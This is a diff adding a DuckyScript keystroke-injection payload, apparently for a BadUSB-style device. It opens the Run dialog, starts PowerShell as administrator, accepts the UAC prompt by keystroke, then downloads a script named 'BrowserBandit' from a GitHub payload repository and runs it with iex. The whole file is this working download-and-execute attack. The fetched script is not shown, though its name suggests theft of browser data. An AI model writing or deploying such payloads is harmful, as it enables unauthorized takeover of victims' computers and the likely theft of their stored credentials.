@@ -1,1 +1,13 @@
+DELAY 100
+GUI d
+GUI r
+DELAY 500
+STRING powershell
+CONTROL SHIFT ENTER
+DELAY 3000
+ALT Y
+ENTER
 
+DELAY 3000
+STRING $url='https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/BrowserBandit.txt?token=GHSAT0AAAAAACXIFIYGLCULBN44HUBYPA4GZXBRDMQ'; $s=(Invoke-WebRequest -Uri $url|select -exp Content); iex $s;exit
+ENTER
